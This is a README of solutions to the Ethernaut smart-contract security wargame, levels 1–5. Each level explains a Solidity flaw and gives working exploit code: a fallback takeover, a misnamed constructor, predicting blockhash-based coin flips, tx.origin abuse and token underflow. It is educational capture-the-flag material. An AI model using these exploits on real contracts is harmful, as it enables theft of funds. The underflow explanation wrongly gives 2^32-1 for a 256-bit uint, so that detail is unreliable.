# Ethernaut Solutions by aki

## Usage

This repo uses Hardhat and ethers.js stack to interact with the Ethernaut contracts. The solutions below, however, endeavor to use the console to execute any required scripts, and therefore use web3 as it is injected into the Ethernaut console. If you fork this repo, be sure to include a `.env` file that follows the same format as the given `.env.example` file.

A couple of npm scripts make it easy to run the code yourself:
1. `npm run solve --level=X` solves the corresponding level, deploying contracts if necessary.
2. `npm run deploy --level=X` only deploys the corresponding contract to the Rinkeby testnet, if it exists. 

## Solutions

### 1. Fallback
A fallback function is called when a contract receives ETH in a transaction that is not handled by any of its methods. This contract's fallback function has a vulnerability that allows us to gain control of the contract and therefore call its `withdraw` method.
```typescript
await contract.contribute({ value: 1 });
await contract.send({ value: 1 }); // Trigger fallback
await contract.withdraw();
```

### 2. Fallout
Before Solidity v0.4.23, constructors were denoted using a function name that was the same as the contract's name. Constructors are only ever called once, during contract creation, but in the case that the constructor's name does not match the contract, it is possible to call it repeatedly as a normal function. The constructor in this level has a typo that allows us to call it and gain control of the contract.
```typescript
await contract.Fal1out();
await contract.collectAllocations();
```

### 3. Coin Flip
This contract attempts to create its own source of randomness by performing some operations on the block number of the block that the `flip` method is mined into. Because the blcok number and these operations are all public, we can create a contract that uses the same calculations to compute the result of the flip before calling original `flip` method.
```solidity
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Level3 {
  using SafeMath for uint256;

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip cf = CoinFlip(INSTANCE_ADDRESS);

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    cf.flip(blockValue.div(FACTOR) == 1);
  }
}

abstract contract CoinFlip {
  function flip(bool _guess) virtual public returns (bool);
}
```

We can pair the contract with a simple script that calls our `attack` method the requisite amount of times, ensuring each subsequent call happens only after the previous has been mined. We cannot simply do this in the `Level3` contract above as the block number must be different between flips as enforced in the original CoinFlip contract. Using Metamask as our provider is annoying here because we must provide manual confirmation for each transaction, so we will use ethers locally:
```typescript
const contract = await ethers.getContractAt(
  'Level3', 
  LEVEL3_CONTRACT_ADDR, 
  (await ethers.getSigners())[0]
);

for (let i = 0; i < 10; i++) {
  await (await contract.attack()).wait();
}
```

### 4. Telephone
`tx.origin` and `msg.sender` are different in a call chain. `tx.origin` always corresponds to the user (EOA) that starts the call chain, whereas `msg.sender` corresponds the caller of the current method/contract (and can thus be an EOA or a contract). For example, if user A calls contract B which calls contract C, within the method call to C, `msg.sender` refers to B while `tx.origin` refers to A. We can use this to our advantage by creating a contract that calls the `Telephone` contract's `changeOwner` method. 
```solidity
pragma solidity ^0.8.0;

contract Level4 {
  Telephone t = Telephone(INSTANCE_ADDRESS);

  function attack() public {
    t.changeOwner(msg.sender);
  }
}

abstract contract Telephone {
  function changeOwner(address _owner) virtual public;
}
```

We simply call our `attack` method to gain control of the `Telephone` contract.
```typescript
await sendTransaction({
  to: LEVEL4_CONTRACT_ADDRESS,
  from: WALLET_ADDRESS,
  data: web3.eth.abi.encodeFunctionSignature('attack()'),
});
```

### 5. Token
The `uint` type in Solidity is an unsigned integer and can never be negative. Negative numbers are represented with two's complement, so -1 is stored as 2^32-1. We can exploit this by transferring more tokens than we have to another address, so that our balance is negative and wraps around to a large positive number.
```typescript
await contract.transfer('0x0000000000000000000000000000000000000000', 50);
```
